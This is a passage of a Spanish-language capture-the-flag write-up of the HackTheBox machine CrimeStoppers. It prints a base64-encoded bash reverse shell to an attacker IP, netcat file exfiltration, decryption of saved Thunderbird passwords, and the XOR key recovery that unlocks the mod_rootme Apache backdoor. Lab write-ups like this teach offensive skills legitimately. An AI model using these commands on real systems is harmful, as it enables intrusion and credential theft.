TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS, conseguimos **RCEEEEEEEEEEE**, dios, como costó (: pero que guapachoso.

Bien, ya tenemos ejecución remota de comandos, démosle un mejor formato a nuestro script para desde el subir el contenido `.zip` y también ejecutar comandos...

> [rceZIPwrapper.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/crimestoppers/rceZIPwrapper.py)

...

Generemos una reverse Shell, pongámonos en escucha por el puerto **4433**:

```bash
❱ nc -lvp 4433
```

Ahora (una de las maneras), generaremos un texto que tenga exactamente nuestra reverse shell:

```bash
❱ printf '#!/bin/bash \nbash -i >& /dev/tcp/10.10.14.6/4433 0>&1'
#!/bin/bash 
bash -i >& /dev/tcp/10.10.14.6/4433 0>&1
```

Ahora lo encodeamos a `base64`:

```bash
❱ printf '#!/bin/bash \nbash -i >& /dev/tcp/10.10.14.6/4433 0>&1' | base64
IyEvYmluL2Jhc2ggCmJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMzIDA+JjE=
```

Tomamos esa cadena y como comando hacia la máquina le indicamos:

1. Decodea la cadena que te estoy pasando en **base64**.
2. Y el resultado quiero que me lo interpretes con una `bash`. O sea, ejecútame lo que sea que venga...

---

```bash
❱ python3 rceZIPwrapper.py -i 10.10.14.6 -c 'echo IyEvYmluL2Jhc2ggCgpiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYvNDQzMyAwPiYx | base64 -d | bash'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_sendREVSH_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listooooones, tamos dentro, hacemos [tratamiento de la **TTY**](https://lanzt.gitbook.io/cheatsheet-pentest/tty) para tener una shell bonita, que no nos de problemas si es que queremos ejecutar `CTRL+C`, nos permita tener histórico y que podamos movernos entre comandos...

Sigamos 🚣

...

# Movimiento lateral : Thunderbird [#](#thunderbird-decrypt) {#thunderbird-decrypt}

Listando que usuario existen el sistema nos encontramos con `dom`, si vamos a su `/home` entonces este árbol de directorios:

```bash
www-data@ubuntu:/home/dom$ ls -la
total 44
drwxr-xr-x 5 dom  dom  4096 Dec 25  2017 .
drwxr-xr-x 3 root root 4096 Dec 16  2017 ..
-rw------- 1 dom  dom    52 Dec 16  2017 .Xauthority
-rw------- 1 dom  dom     5 Dec 22  2017 .bash_history
-rw-r--r-- 1 dom  dom   220 Dec 16  2017 .bash_logout
-rw-r--r-- 1 dom  dom  3771 Dec 16  2017 .bashrc
drwx------ 2 dom  dom  4096 Dec 16  2017 .cache
-rw-r--r-- 1 dom  dom   675 Dec 16  2017 .profile
drwx------ 2 dom  dom  4096 Dec 16  2017 .ssh
-rw-r--r-- 1 dom  dom     0 Dec 16  2017 .sudo_as_admin_successful
drw-r-xr-x 3 root root 4096 Dec 16  2017 .thunderbird
-r--r--r-- 1 root root   33 Aug  2 13:20 user.txt
```

Hay un directorio oculto algo llamativo y que no había visto antes en otras máquinas: `.thunderbird`, veamos que hay en su contenido:

```bash
www-data@ubuntu:/home/dom/.thunderbird$ ls -la
total 12
drw-r-xr-x 3 root root 4096 Dec 16  2017 .
drwxr-xr-x 5 dom  dom  4096 Dec 25  2017 ..
drw-r-xr-x 9 root root 4096 Dec 16  2017 36jinndk.default
```

```bash
www-data@ubuntu:/home/dom/.thunderbird$ cd 36jinndk.default/
www-data@ubuntu:/home/dom/.thunderbird/36jinndk.default$ ls -a 
.                             blist.sqlite            cookies.sqlite      formhistory.sqlite         minidumps           saved-telemetry-pings    webappsstore.sqlite-shm
..                            blocklist-addons.json   cookies.sqlite-shm  global-messages-db.sqlite  panacea.dat         search.json.mozlz4       webappsstore.sqlite-wal
.parentlock                   blocklist-gfx.json      cookies.sqlite-wal  gmp                        permissions.sqlite  secmod.db                xulstore.json
ImapMail                      blocklist-plugins.json  crashes             history.mab                places.sqlite       session.json
Mail                          blocklist.xml           datareporting       key3.db                    places.sqlite-shm   sessionCheckpoints.json
SiteSecurityServiceState.txt  cert8.db                directoryTree.json  kinto.sqlite               places.sqlite-wal   storage.sqlite
abook.mab                     compatibility.ini       extensions.ini      logins.json                prefs.js            times.json
addons.json                   content-prefs.sqlite    extensions.json     mailViews.dat              revocations.txt     webappsstore.sqlite
```

Ufff, varios archivos, algunos con nombres llamativos como `key3.db`, `logins.json`, `session.json` o `storage.sqlite`. 

Si buscamos en todos los objetos la cadena `username` encontramos algo interesante a la vista:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_thunderbirdF_grepUsername.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Hay unas credenciales encriptadas y referencias hacia el usuario `dom` 😮 puede ser un **rabbit hole** como pueda que no, exploremos:

> **Thunderbird** hace referencia a `Mozilla Thunderbird`, un gestor de correo electrónico, de noticias y de chats. [Más info: "¿Qué es Thunderbird?"](https://www.thunderbird.net/es-MX/about/).

Buscando info relacionada con `decrypt password thunderbird` en internet llegamos a [este foro](http://forums.mozillazine.org/viewtopic.php?f=39&t=2884451) donde podemos destacar cositas:

* Las contraseñas en **Mozilla** son guardadas (o bueno en **2014**) en dos archivos:
  * `signons.sqlite`.
  * `keys3.db`.

Estos objetos deberían estar en una ruta con este formato: `~/.thunderbird/*.default`.

Si nos fijamos concuerda con lo nuestro, ya que tenemos `/home/dom/.thunderbird/36jinndk.default`, así que podemos pensar que `36jinndk` es un perfil que se le generó al usuario `dom`.

> [On linux, the password database is stored in](https://security.stackexchange.com/questions/8780/is-it-possible-to-easily-retrieve-thunderbirds-passwords-with-access-to-hdd?newreg=a4029c04cb954aedb4f60a9201574dc7#comment233382_8819): `/home/$USER/.thunderbird/$RANDOM_STRING.default/signons.sqlite`. 

Bien, si nos fijamos en nuestros objetos el archivo `signons.sqlite` no existe, es ahí cuando llegamos a este nuevo [hilo](https://security.stackexchange.com/questions/109140/how-to-read-the-key3-db-file) que nos habla sobre el archivo `key3.db` y su función que es almacenar la llave necesaria para desencriptar las passwords guardadas por **Mozilla**.

En el hilo una de las respuestas nos indica que el nombre de `logins.json` antes era `signons.sqlite`, así que tamos perfectos y cero preocupados en tener que encontrar otro archivo.

Leyendo nos damos cuenta de que **Thunderbird** genera una ["Master Password"](https://support.mozilla.org/en-US/kb/protect-your-thunderbird-passwords-master-password) vacía o la que indique el usuario, esta **master password** sería la que protegería a tooooodas las contraseñas que se vayan guardando. Por lo que si no contamos con una **master password** (y es necesaria) tendremos que buscar maneras de encontrarla 😨

Profundizando un poco más llegamos a este [nuevo hilo](https://superuser.com/questions/1218631/how-to-read-key3-db-and-logins-json-in-plain-text/1519092) donde referencian dos herramientas que se encargan de desencriptar las contraseñas:

* [firepwd](https://github.com/lclevy/firepwd).
* [firefox_decrypt](https://github.com/unode/firefox_decrypt).

> Pa leer: [Reveal saved Mozilla Firefox passwords](https://blog.tajuma.com/?p=35).

Así que juguemos con las dos, vamos a sus repos y nos las clonamos, empecemos con `firepwd`:

---

## Dumpeamos credenciales de <u>Thunderbird</u> [📌](#dump-thunderbird) {#dump-thunderbird}

🎈 **firepwd.py**:

```bash
❱ python3 firepwd.py 
cannot find key4.db or key3.db
```

Directamente nos pide el archivo `key3.db`, así que pasémoslo a nuestra máquina y volvamos a ejecutar:

```bash
❱ python3 firepwd.py 
 SEQUENCE {
   SEQUENCE {
   ...
...
missing logins.json or signons.sqlite
...
```

Nos sale error, hace falta el archivo `logins.json`, así que también lo pasamos a nuestra máquina y volvemos a ejecutar:

```bash
❱ python3 firepwd.py 
 SEQUENCE {
   SEQUENCE {
   ...
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firepwd_passwordsDumped.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perrrrrfecto, nos devuelve una contraseña del servicio `imap` y `smtp`, podemos probar a hacer reutilización de contraseñas a ver si son funcionales en el sistema como el usuario `dom`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_su_dom_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listooooooooooooones, somos **dom** (: antes de seguir veamos rápidamente como hubiera sido con `firefox_decrypt.py`:

🎈 **firefox_decrypt.py**:

Este script nos pide la ruta donde están tooooooodos los archivos del perfil, o sea: `36jinndk.default`, pues hagamos la sencilla, [comprimamos todo el directorio](https://www.cyberciti.biz/faq/how-do-i-compress-a-whole-linux-or-unix-directory/) y nos lo pasamos a nuestro sistema para posteriormente ejecutar el programa haciendo referencia a ese directorio:

```bash
www-data@ubuntu:/tmp$ tar -zcvf thunderthunder.tar.gz /home/dom/.thunderbird/36jinndk.default/
/home/dom/.thunderbird/36jinndk.default/
/home/dom/.thunderbird/36jinndk.default/webappsstore.sqlite
...
/home/dom/.thunderbird/36jinndk.default/crashes/store.json.mozlz4
```

```bash
www-data@ubuntu:/tmp$ ls
thunderthunder.tar.gz
```

Ahora en nuestra máquina nos ponemos en escucha sobre un puerto y le indicamos que todo lo que llegue por ese puerto lo guarde en un archivo llamado `thunderthunder.tar.gz`:

```bash
❱ nc -lvp 4434 > thunderthunder.tar.gz
```

Y en la máquina víctima le decimos que envíe el contenido de `thunderthunder.tar.gz` esperando 10 segundos para que se copie tooooodo todito:

```bash
www-data@ubuntu:/tmp$ nc -w 10 10.10.14.6 4434 < thunderthunder.tar.gz
```

Recibimos la petición en nuestro listener, esperamos y ahora validamos la integridad del archivo:

```bash
www-data@ubuntu:/tmp$ md5sum thunderthunder.tar.gz 
f6e7ceae0c34fc66890c6072a3cddee5  thunderthunder.tar.gz
❱ md5sum thunderthunder.tar.gz 
f6e7ceae0c34fc66890c6072a3cddee5  thunderthunder.tar.gz
```

Lo descomprimimos, (se genera una carpeta `home`, ahí esta el perfil de **Mozilla**, no te asustes) y ejecutamos el script:

```bash
❱ tar xvf thunderthunder.tar.gz 
❱ mv home/dom/.thunderbird/36jinndk.default/ .
❱ chmod 755 36jinndk.default/
❱ python3 firefox_decrypt.py 36jinndk.default/
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firefow_decrypt_passwordsDumped.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, conseguimos la contraseña, así que con cualquiera de las dos herramientas lo hubiéramos logrado (:

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Después de una ardua enumeración volvemos al directorio `.thunderbird` y nos escondemos dentro de otro directorio, en este caso de `ImapMail`:

```bash
dom@ubuntu:~/.thunderbird/36jinndk.default$ cd ImapMail/
dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail$ ls
crimestoppers.htb  crimestoppers.htb.msf
dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail$ cd crimestoppers.htb/
```

Dentro de `crimestoppers.htb/` hay varios archivos:

```bash
dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ ls -la
total 72
drw-r-xr-x 2 root root 4096 Dec 16  2017 .
drw-r-xr-x 3 root root 4096 Dec 16  2017 ..
-rw-r-xr-x 1 root root 1268 Dec 16  2017 Archives.msf
-rw-r-xr-x 1 root root 2716 Dec 16  2017 Drafts-1
-rw-r-xr-x 1 root root 2599 Dec 16  2017 Drafts-1.msf
-rw-r-xr-x 1 root root 1265 Dec 16  2017 Drafts.msf
-rw-r-xr-x 1 root root 1024 Dec 16  2017 INBOX
-rw-r-xr-x 1 root root 4464 Dec 16  2017 INBOX.msf
-rw-r-xr-x 1 root root 1268 Dec 16  2017 Junk.msf
-rw-r-xr-x 1 root root   25 Dec 16  2017 msgFilterRules.dat
-rw-r-xr-x 1 root root 7767 Dec 16  2017 Sent-1
-rw-r-xr-x 1 root root 4698 Dec 16  2017 Sent-1.msf
-rw-r-xr-x 1 root root 1263 Dec 16  2017 Sent.msf
-rw-r-xr-x 1 root root 1271 Dec 16  2017 Templates.msf
-rw-r-xr-x 1 root root 1620 Dec 16  2017 Trash.msf
```

Estos hacen referencia a los distintos buzones del correo de `dom`, al recorrer algunos encontramos cositas interesantes:

```bash
dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat INBOX
```

```html
From - Sat Dec 16 11:47:00 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: WhiteRose@DarkArmy.htb
Received: from [172.16.10.153] (ubuntu [172.16.10.153])
        by DESKTOP-2EA0N1O with ESMTPA
        ; Sat, 16 Dec 2017 14:46:57 -0500
To: dom@CrimeStoppers.htb
From: WhiteRose <WhiteRose@DarkArmy.htb>
Subject: RCE Vulnerability
Message-ID: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Date: Sat, 16 Dec 2017 11:46:54 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

Hello,

I left note on "Leave a tip" page but no response.  Major vulnerability 
exists in your site!  This gives code execution. Continue to investigate 
us, we will sell exploit!  Perhaps buyer will not be so kind.

For more details place 1 million ecoins in your wallet.  Payment 
instructions will be sent once we see you move money.
```

Un correo de `darkarmy`, ya nos habíamos encontrado con ellos al inicio de la máquina, acá hacen referencia a la misma explotación del wrapper que nos permitió conseguir **RCE**. Si seguimos mirando hay más correos:

Los correos que `dom` envió:

```bash
dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat Sent-1
```

La respuesta a `darkarmy`:

```bash
From
Subject: Re: RCE Vulnerability
To: WhiteRose <WhiteRose@DarkArmy.htb>
References: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
From: dom <dom@crimestoppers.htb>                              
Message-ID: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>    
Date: Sat, 16 Dec 2017 11:49:27 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
In-Reply-To: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

If we created a bug bounty page, would you be open to using them as a
middle man?  Submit the bug, they will verify the existence and handle
the payment.

I don't know how this ecoins things work.

On 12/16/2017 11:46 AM, WhiteRose wrote:
> Hello,
>
> I left note on "Leave a tip" page but no response.  Major
> vulnerability exists in your site!  This gives code execution.
> Continue to investigate us, we will sell exploit!  Perhaps buyer will 
> not be so kind.
>
> For more details place 1 million ecoins in your wallet.  Payment
> instructions will be sent once we see you move money.
>
...
```

Le adjunta a `santiago` lo hablado con la **darkarmy**:

```bash
...
From                                                                                                                                                                                            
Subject: Fwd: Re: RCE Vulnerability                                                                                                                                                             
References: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
To: santiago@crimestoppres.htb
From: dom <dom@crimestoppers.htb>
X-Forwarded-Message-Id: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Message-ID: <24afa630-bf3c-5361-9c20-969bf934bd14@crimestoppers.htb>
Date: Sat, 16 Dec 2017 11:55:50 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
In-Reply-To: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Content-Type: multipart/alternative;
 boundary="------------6B48F005D20D18C4F951CD41" 
Content-Language: en-US

This is a multi-part message in MIME format.
--------------6B48F005D20D18C4F951CD41
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit

Did you know anything about this?  Anyways, I'm trying to get them to 
agree to an alternative form of payment where we can better track the 
recipient.

Hope the DarkArmy thinks we're a bunch of dummies that don't know 
anything about eCoin.
...
```

Y un correo hacia `elliot`:

```bash
From 
To: elliot@ecorp.htb
From: dom <dom@crimestoppers.htb>
Subject: Potential Rootkit
Message-ID: <54814ded-5024-79db-3386-045cd5d205b2@crimestoppers.htb>
Date: Sat, 16 Dec 2017 12:55:24 -0800 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

Elliot.

We got a suspicious email from the DarkArmy claiming there is a Remote 
Code Execution bug on our Webserver.  I don't trust them and ran 
rkhunter, it reported that there a rootkit installed called: 
apache_modrootme backdoor.

According to my research, if this rootkit was on the server I should be 
able to run "nc localhost 80" and then type "get root" to get a root 
shell.   However, the server just errors out without providing any shell 
at all.  Would you mind checking if this is a false positive?
```

🙀 ufff, en este último nos hablan de un `rootkit` que fue descubierto con ayuda de la herramienta **rkhunter**. El **rootkit** se hace llamar `apache_modrootme`.

Nos indica que según su búsqueda si el **rootkit** existiera en el sistema, debería ejecutar `nc localhost 80` y después escribir `get root` para obtener una **Shell como el usuario root**, pero que una vez ingresa el `get root` no pasa nada y solo ve errores...

Opa, pues interesante, si nos vamos a la web rápidamente encontramos el repositorio del rootkit:

* [https://github.com/sajith/mod-rootme](https://github.com/sajith/mod-rootme).

Pero antes de abordar esto, conozcamos que es un `rootkit`:

💣 *Un **rootkit** es un software que permite tener acceso total a un sistema, las mejor llamadas "puertas traseras", las cuales nos generan **persistencia** en una máquina, se caracterizan por pasar desapercibidas en toooooodo el sistema e incluso difíciles de encontrar por analizadores de **rootkits**. [Más info: avast](https://www.avast.com/es-es/c-rootkit).*

Bien, sigamos...

---

## Encontramos <u>rootkit</u> en el sistema [📌](#rootkit-found) {#rootkit-found}

Según la descripción del `rootkit` vemos su uso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_rootkitrepo_files.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos dos referencias a archivos, busquémoslos en el sistema:

```bash
dom@ubuntu:~$ ls -la /etc/apache2/mods-available/rootme.load /usr/lib/apache2/modules/mod_rootme.so
-rw-r--r-- 1 root root    64 Dec 16  2017 /etc/apache2/mods-available/rootme.load
-rw-r----- 1 root dom  48584 Dec 22  2017 /usr/lib/apache2/modules/mod_rootme.so
```

```bash
dom@ubuntu:~$ file /etc/apache2/mods-available/rootme.load /usr/lib/apache2/modules/mod_rootme.so
/etc/apache2/mods-available/rootme.load: ASCII text
/usr/lib/apache2/modules/mod_rootme.so:  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=792d97353c062bb316fbb45f6109ade9a87591c7, not stripped
```

Bien, una descripción y el binario del `rootkit`. Intentemos hacerlo funcionar así como nos indicaba el correo (y el repo):

```bash
dom@ubuntu:~$ nc localhost 80
get root
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.25 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
```

Pero sip, obtenemos errores... 

🎿 Sabemos que existe un `rootkit` en el sistema, pero si intentamos usarlo como en el repo (o en el correo) no nos funciona, pues movámoslo hacia nuestra máquina y hagamos un análisis estático del binario, pueda que los atacantes lo hayan modificado para que el uso sea exclusivamente de ellos:

```bash
❱ nc -lvp 4433 > mod_rootme
```

```bash
dom@ubuntu:~$ nc -w 20 10.10.14.6 4433 < /usr/lib/apache2/modules/mod_rootme.so
```

Listones.

---

## Hacemos reversing hacia el <u>rootkit</u> [📌](#rootkit-r2) {#rootkit-r2}

Jugaremos con [radare2](https://github.com/radareorg/radare2).

> [Radare2: abriendo las puertas al reversing](https://www.welivesecurity.com/la-es/2016/08/17/radare2-reversing/).

* [Brutal post para adentrarte en el mundo del reversing y entender algunas instrucciones](http://seguesec.blogspot.com/2011/01/principios-en-ensamblador.html).
* [Guia super completa para el uso de **radare2**](https://book.rada.re/).

Lo cargamos, analizamos las funciones (`aaa`) del binario y las imprimimos (`afl`):

```bash
❱ r2 mod_rootme 
[0x00000f70]> aaa
...
[0x00000f70]> afl
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_afl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, todas con nombres llamativos, pero existe una que se relaciona con nuestra máquina, ¿cuál es? Exacto, `sym.darkarmy`, pues pasemos el lenguaje máquina a lenguaje ensamblador e intentemos (jaaaaaa 😂) entender que esta pasando en esa función, usamos `pdf @` que seria `print disassemble function @ nombre_de_la_funcion`:

```bash
[0x00000f70]> pdf @ sym.darkarmy
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

🖤 ***Esto es lo que me gusta de <u>radare2</u>, lindos colores y fácil de ver los flujos :P***

Bien, de primeras nos fijamos en el comentario "`HackTheBox`", pero que realmente es una cadena (`str`) que su dirección en memoria esta siendo guardada en el registro `rsi`.

Arriba de esta instrucción vemos el mismo proceso solo que ahora en lugar de una `str` toma una dirección de memoria y la guarda en el registro `rdi`.

* [lea (Load Effective Address)](https://es.stackoverflow.com/questions/89727/para-que-sirve-lea-en-ensamblador).

Si nos fijamos hay un loop el cual da 10 iteraciones:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy_drawLoop.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listos, algo llamativo es que hace un `xor` por cada byte, compara la string `HackTheBox` con el valor que tenga la dirección `0x00001bf2`, por lo que podemos pensar que `HackTheBox` es la llave necesaria para jugar con el `xor`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xor_example.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues veamos el contenido de esa dirección:

```bash
[0x00000f70]> pxw @ 0x00001bf2
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pxw_1bf2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora, si recordamos el bucle hace 10 iteraciones, por lo que de ese output de arriba debemos tomar los 10 caracteres:

```bash
[0x00000f70]> x/10x 0x00001bf2
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00001bf2  0e14 0d38 3b0b 0c27 1b01
```

Bien, ya tenemos nuestra posible key y los valores con los que esta haciendo el `xor`, pues hagamos un script rápido en **Python** que nos devuelva el resultado de esa operación:

* [Hay un ejemplo gráfico bien lindo acá para entender **XOR** - XOR Python Byte Strings](https://nitratine.net/blog/post/xor-python-byte-strings/).
* [Nos basaremos en este ejemplo para nuestro script](https://subscription.packtpub.com/book/networking_and_servers/9781789534443/1/ch01lvl1sec13/xor).

---

```py
#!/usr/bin/python3

'''
0e14 0d38 3b0b 0c27 1b01
'''

key = "HackTheBox"
xor_value = '\x0e\x14\x0d\x38\x3b\x0b\x0c\x27\x1b\x01'
text = ""

for i in range(len(xor_value)):
    '''
    xor_hex = Tomamos cada valor hexadecimal
    key_value = len(key) = 10   |   0/10 .. 1/10 .. 2/10 ..   |   Extraemos cada valor de la key 
    xor_result = Pasamos cada valor ascii a su valor decimal y hacemos la comparativa XOR.
    '''

    xor_hex = xor_value[i]
    key_value = key[i%(len(key))]
    xor_result = ord(key_value) ^ ord(xor_hex)

    # Y ahora tomamos cada valor decimal y lo pasamos a su valor ascii, así juntamos toda la cadena.
    text += chr(xor_result)

print(text)

'''
    # Así podemos ver como se genera el XOR:
    print(bin(ord(key_value))[2:].zfill(8))
    print(bin(ord(xor_hex))[2:].zfill(8))
    print("----------")
    print(bin(xor_result)[2:].zfill(8))
    print()
'''
```

Perfecto, si ejecutamos el script, vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_xorKEY_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa, interesante, si lo concatenamos con nuestra enumeración (que no puse antes para no enredar) del binario vemos la función `sym.rootme_post_read_request` que es la que valida lo que le pasemos cuando ejecutamos `nc localhost 80`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_postREADrequests.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahí vemos que toma un argumento, así que podemos probar esa cadena devuelta por el programa ahora sobre el `rootkit`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_domSH_rootkitDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo, tenemos el `rootkit` en funcionamiento, por lo tanto tenemos una Shell como el usuario **root** (:

...

# Post-Explotación: Accedemos por <u>SSH</u> usando <u>IPv6</u> [#](#ssh-ipv6) {#ssh-ipv6}

**IppSec** nos deja una nota:

```bash
root@ubuntu:/root# cat Congratulations.txt 
Hope you enjoyed the machine! The root password is crackable, but I would be surprised if anyone managed to crack it without watching the show.  But who knows it is DESCrypted after all so BruteForce is possible.

Oh and kudo's if you just SSH'd in via IPv6 once you got dom's pw :)

-Ippsec
```

El tema del crackeo lo intenté, pero nadita, también nos dice que podemos establecer una `SSH` por medio de un direccionamiento `IPv6`, pues intentémoslo:

* [How to ssh to IPv6 address on Linux](https://linuxconfig.org/how-to-ssh-to-ipv6-address-on-linux/).

---

```bash
root@ubuntu:/root# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:6c:2b brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.80/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:6c2b/64 scope global mngtmpaddr dynamic 
       valid_lft 86286sec preferred_lft 14286sec
    inet6 fe80::250:56ff:feb9:6c2b/64 scope link 
       valid_lft forever preferred_lft forever
```

Nuestra interfaz es la `ens33`, tomamos su dirección IPv6:

```bash
inet6 dead:beef::250:56ff:feb9:6c2b
```

Y ahora desde nuestra máquina nos conectamos a esa dirección con el usuario `dom` (que tenemos credenciales):

```bash
❱ ssh dom@dead:beef::250:56ff:feb9:6c2b
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_ssh_domSH_ipv6.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Peeeererererfecto, ahora sí, veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

Una parte final muuuuuy dolorosa mentalmente hablando 😆 

Linda experiencia, muy loca y sobre todo muy bien encaminada. Me encanto la parte de criptografía, a ser verdad esta fue en mucho tiempo mi reencuentro con ella así que no fue muy.. ¿llevadero? jajaj, pero igual refrescamos ideas y sobre todo aprendimos un montón. 

¡BRUTAL!

Y weno, nos vamos, nos vemos y nos vimos! A seguir rompiendo todooooooooooOo0!